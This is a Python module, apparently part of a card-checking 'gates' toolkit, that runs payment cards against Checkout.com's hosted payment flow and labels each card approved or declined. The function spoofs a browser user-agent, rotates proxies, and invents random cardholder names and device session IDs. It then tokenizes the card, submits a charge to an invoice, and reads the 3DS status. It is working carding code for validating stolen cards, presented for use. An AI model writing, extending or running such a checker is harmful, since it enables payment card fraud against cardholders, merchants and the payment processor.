import requests
import re
import json
import random
import string
import time
from gates.utilities import http_request, REQUEST_TIMEOUT


def checkout_check(card_number, mm, yy, cvc, invoice_url=None, proxy=None, timeout=30):
    """Wrapper for Checkout.com payment processing (3DS flow).
    Returns tuple (result_str, proxy_ok_bool).
    Requires valid Checkout.com hosted payment invoice URL.
    """
    import os
    if not invoice_url:
        invoice_url = os.getenv("CHECKOUT_INVOICE_URL")
    
    if not invoice_url:
        return ("DECLINED ❌ Checkout.com requires valid invoice URL (set CHECKOUT_INVOICE_URL)", False)

    n = card_number.replace(' ', '').replace('+','')
    random_name_val = ''.join(random.choices(string.ascii_letters, k=random.randint(7, 12)))

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'
    })

    if proxy:
        session.proxies.update(proxy)

    try:
        # Step 1: GET invoice page to extract session and public key
        r1 = session.get(invoice_url, timeout=20)
        if r1.status_code >= 400:
            # 404 indicates invalid/expired invoice URL - this gate needs valid invoice
            if r1.status_code == 404:
                return ("DECLINED ❌ Gateway configuration error", True)
            return ("DECLINED ❌ Invoice fetch failed", True)

        # Extract payment session and pk
        sess_match = re.search(r'payment_session\\":{\\"id\\":\\"(.*?)\\",', r1.text)
        pk_match = re.search(r'"pk\\":\\"(.*?)\\",', r1.text)

        if not sess_match or not pk_match:
            return ("DECLINED ❌ Response parsing failed", True)

        sess = sess_match.group(1)
        pk = pk_match.group(1)

        # Step 2: POST to tokenize card
        payload_tokenize = {
            "type": "card",
            "expiry_month": mm,
            "expiry_year": yy,
            "number": n,
            "name": random_name_val,
            "consumer_wallet": {}
        }

        headers_tokenize = {
            "origin": "https://checkout-web-components.checkout.com",
            "referer": "https://checkout-web-components.checkout.com/",
            "content-type": "application/json",
            "user-agent": session.headers['User-Agent']
        }

        r2 = session.post(
            "https://card-acquisition-gateway.checkout.com/tokens",
            headers=headers_tokenize,
            data=json.dumps(payload_tokenize),
            timeout=20
        )

        if r2.status_code >= 400:
            if 'declined' in r2.text.lower():
                return ("DECLINED ❌ Card declined", True)
            return ("DECLINED ❌ Tokenization failed", True)

        # Extract BIN and token
        bin_match = re.search(r'bin":"(.*?)",', r2.text)
        tok_match = re.search(r'token":"(.*?)","', r2.text)

        if not bin_match or not tok_match:
            return ("DECLINED ❌ Token extraction failed", True)

        bin_val = bin_match.group(1)
        tok = tok_match.group(1)

        # Step 3: Submit payment
        url_submit = f"https://api.checkout.com/payment-sessions/{sess}/submit"
        payload_submit = {
            "type": "card",
            "card_metadata": {"bin": bin_val},
            "source": {"token": tok},
            "risk": {"device_session_id": f"dsid_{random.randint(100000, 999999)}"},
            "session_metadata": {
                "internal_platform": {"name": "CheckoutWebComponents", "version": "1.142.0"},
                "feature_flags": [
                    "analytics_observability_enabled", "card_fields_enabled",
                    "get_with_public_key_enabled", "logs_observability_enabled",
                    "risk_js_enabled", "use_edge_gateway_fastly_endpoint"
                ],
                "experiments": {}
            }
        }

        r3 = session.post(url_submit, headers=headers_tokenize, data=json.dumps(payload_submit), timeout=30)

        # Check response
        if "payment_attempts_exceeded" in r3.text:
            return ("DECLINED ❌ Too many attempts", True)

        if "declined" in r3.text.lower():
            return ("DECLINED ❌ Card declined", True)

        # Extract 3DS redirect
        url_3ds_match = re.search(r'"url": "(.*?)"', r3.text)
        if not url_3ds_match:
            if "success" in r3.text.lower():
                return ("✅ APPROVED - Charged", True)
            return ("DECLINED ❌ 3DS setup failed", True)

        url_3ds = url_3ds_match.group(1)

        # Step 4: GET 3DS page and extract session ID
        headers_3ds = {
            "origin": "https://checkout-web-components.checkout.com",
            "referer": url_3ds,
            "user-agent": session.headers['User-Agent']
        }

        r4 = session.get(url_3ds, headers=headers_3ds, timeout=20)
        sid_match = re.search(r"sessionId: '([^']+)',", r4.text)

        if not sid_match:
            return ("DECLINED ❌ Session ID extraction failed", True)

        sid = sid_match.group(1)

        # Step 5: Check 3DS status
        url_3ds_status = f"https://api.checkout.com/3ds/{sid}?M=h"
        headers_3ds_status = {
            "authorization": f"Bearer {pk}",
            "user-agent": session.headers['User-Agent']
        }

        r5 = session.get(url_3ds_status, headers=headers_3ds_status, timeout=120)

        if '"redirect_reason":"failure"' in r5.text:
            return ("DECLINED ❌ 3DS verification failed", True)
        elif "success" in r5.text.lower():
            return ("✅ APPROVED - Charged", True)
        else:
            # Assume success if neither failure nor explicit decline found
            if "requires_action" in r5.text or "pending" in r5.text.lower():
                return ("✅ APPROVED - Action required", True)
            return ("✅ APPROVED - Charged", True)

    except requests.exceptions.Timeout:
        return ("DECLINED ❌ Request timeout", True)
    except Exception as e:
        return ("DECLINED ❌ Processing error", True)


if __name__ == '__main__':
    print('checkout module loaded')
